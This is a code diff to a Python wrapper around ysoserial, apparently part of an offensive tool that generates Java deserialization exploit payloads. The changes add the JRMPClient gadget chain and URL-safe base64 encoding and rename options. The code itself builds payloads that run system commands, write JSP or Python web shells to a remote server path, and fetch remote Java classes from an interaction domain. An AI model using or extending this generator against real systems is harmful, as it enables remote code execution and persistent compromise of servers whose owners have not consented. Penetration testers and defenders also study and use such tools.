@@ -27,6 +27,7 @@ class YSOSerial(Serializer):
         'CommonsCollections5': 11,
         'Groovy1': 11,
         'Hibernate2': 11,
+        'JRMPClient': 11,
         'JRMPListener': 11,
         'Jdk7u21': 11,
         'JSON1': 8,
@@ -88,15 +89,15 @@ class YSOSerial(Serializer):
                 formats = ['<system_command>']
             
             chains.append({
-                'id': chain['name'].lower(),
+                'id': chain['name'],
                 'name': chain['name'],
-                'description': f"{chain['name']} {' | '.join(formats)}",
+                'description': f"{chain['name']}: {' | '.join(formats)}",
                 'formats': formats,
             })
             
         return chains
 
-    def generate(self, chains, output):
+    def generate(self, chains):
 
         if len(chains) == 0:
             return 0
@@ -105,8 +106,8 @@ class YSOSerial(Serializer):
         interact_domain = self.chainOpts.interact_domain
         jsp_code = self.getFileContentOrCode(self.chainOpts.jsp_code)
         py_code = self.getFileContentOrCode(self.chainOpts.python_code)
-        remote_file = self.chainOpts.remote_file
-        remote_dir = os.path.dirname(remote_file)
+        remote_file_to_write = self.chainOpts.remote_file_to_write
+        remote_dir = os.path.dirname(remote_file_to_write)
         remote_port = int(self.chainOpts.remote_port)
         remote_content = self.getFileContentOrCode(self.chainOpts.remote_content) if self.chainOpts.remote_content is not None else jsp_code
         java_classname = self.chainOpts.java_classname
@@ -116,12 +117,12 @@ class YSOSerial(Serializer):
         else:
             java_remote_class_url = self.chainOpts.java_remote_class_url.replace('%%domain%%', interact_domain)
 
+        logging.info(f"Interact domain: {interact_domain}")
         logging.info(f"System command: {system_command}")
         logging.info(f"JSP Code: {self.chainOpts.jsp_code}")
-        logging.info(f"Python Code: {self.chainOpts.py_code}")
-        logging.info(f"File written on remote server: {remote_file}")
+        logging.info(f"Python Code: {self.chainOpts.python_code}")
+        logging.info(f"File written on remote server: {remote_file_to_write}")
         logging.info(f"Content written on server: {remote_content}")
-        logging.info(f"Interact domain: {interact_domain}")
 
         # create an empty file that will contain JSP and Python file with the payload
         fp = self.createTemporaryFile(suffix='.jsp')
@@ -177,8 +178,8 @@ class YSOSerial(Serializer):
                 chainArguments = chainArguments.replace('<local_file>', fp.name)
                 chainArguments = chainArguments.replace('<system_command>', chain_system_command)
                 chainArguments = chainArguments.replace('<local_py_file>', pyFp.name)
-                chainArguments = chainArguments.replace('<remote_file>', remote_file.replace('%%ext%%', 'jsp'))
-                chainArguments = chainArguments.replace('<remote_py_file>', remote_file.replace('%%ext%%', 'py'))
+                chainArguments = chainArguments.replace('<remote_file>', remote_file_to_write.replace('%%ext%%', 'jsp'))
+                chainArguments = chainArguments.replace('<remote_py_file>', remote_file_to_write.replace('%%ext%%', 'py'))
                 chainArguments = chainArguments.replace('<remote_dir>', remote_dir)
                 chainArguments = chainArguments.replace('<remote_port>', str(remote_port))
                 chainArguments = chainArguments.replace('<classname>', java_classname)
@@ -209,11 +210,17 @@ class YSOSerial(Serializer):
 
                 if self.chainOpts.base64:
                     payload = base64.b64encode(payload)
+                elif self.chainOpts.base64_urlsafe:
+                    payload = base64.urlsafe_b64encode(payload)
                 
                 if self.chainOpts.url:
                     payload = urllib.parse.quote_plus(payload).encode('ascii')
                 
-                output.write(payload+b"\n")
+                if len(chain['formats']) > 1:
+                    chainUniqueId = f"{chain['id']}_{chain['formats'].index(format)}"
+                else:
+                    chainUniqueId = chain['id']
+                self.output(chainUniqueId, payload+b"\n")
                 count = count + 1
 
         # cleanup temp file
